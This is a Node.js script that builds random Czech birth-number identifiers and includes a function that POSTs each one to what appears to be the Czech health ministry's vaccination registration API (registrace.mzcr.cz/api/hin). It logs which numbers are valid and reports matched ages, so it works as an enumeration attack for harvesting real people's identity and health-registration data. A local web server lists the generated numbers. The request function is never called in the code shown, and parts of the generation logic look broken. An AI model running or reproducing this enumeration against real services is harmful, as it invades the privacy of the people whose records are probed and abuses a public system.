var https = require('https');
var http = require('http');

const d = Date.now()

Number.prototype.pad = function (n) {
    return new Array(n).join('0').slice((n || 2) * -1) + this;
}

const verbose = true
const higherAge = true
const real = false

let array = []

const max_iterations = 10

sendHttp = async (num) => {
    data = `{"hin":"${num}"}`
    const options = {
        hostname: 'registrace.mzcr.cz',
        port: 443,
        path: '/api/hin',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    }
    const req = https.request(options, res => {

        res.on('data', r => {
            res = JSON.parse(r)
            if (verbose && res.valid) console.log("valid", num, res);
            else if (res.valid && res.agId) console.log("Found a Match, ", num, " with age ", res.age)
            else console.log("invalid", num);

        })
    })

    req.on('error', error => {
        console.error(error)
    })

    req.write(data)
    req.end()
}

start = () => {
    for (let i = 0; i < max_iterations; i++) {
        if (real) {
            let a = ('0' + (Math.floor(Math.random() * 2) ? Math.floor(Math.random() * (99 - 55) + 55) : Math.floor(Math.random() * (20)))).slice(-2)
            let b = ('0' + (Math.floor(Math.random() * 12) + 1)).slice(-2)
            let c = ('0' + (Math.floor(Math.random() * 27) + 1)).slice(-2)
            let n = a + b + c

            console.log(a, b, c, n);

            //let n = ('0' + Math.floor(Math.random() * 20)).slice(-2) + ('0' + Math.floor(Math.random() * 12)).slice(-2) + ('0' + Math.floor(Math.random() *25)).slice(-2)
            let modulo = n % 11
            console.log(modulo);
            n = n + ('000' + ((Math.floor(Math.random() * 900) * 11) - modulo)).slice(-4)
            console.log(n);

            console.log((n % 11 == 0) && n.length == 10, n);

            if (!((n % 11 == 0) && n.length == 10)) {
            console.log("FAILED");
            console.log(n);
         
         
            break;
            }
        }

        if (higherAge) {
            let a = ('0' + Math.floor(Math.random() * 40)).slice(-2)
            let b = ('0' + (Math.floor(Math.random() * 12) + 1)).slice(-2)
            let c = ('0' + (Math.floor(Math.random() * 27) + 1)).slice(-2)

            let z = ('00' + (Math.floor(Math.random() * 999) + 1)).slice(-3)

            n = a + b + c +z
        }

        if (n) array.push(n)
        
        if (i == max_iterations - 1) {
            let a = array
            array = []
            return a
        }
        
    }
}

start()

const s = http.createServer((req, res) => {
    res.write(start().map(l => `<p>${l.slice(-l.length, 6)}/${l.slice(6, l.length)}</p>${l}`).join(''))
    res.end()
})
s.listen(8000)
const a = Date.now() - d

console.log(a);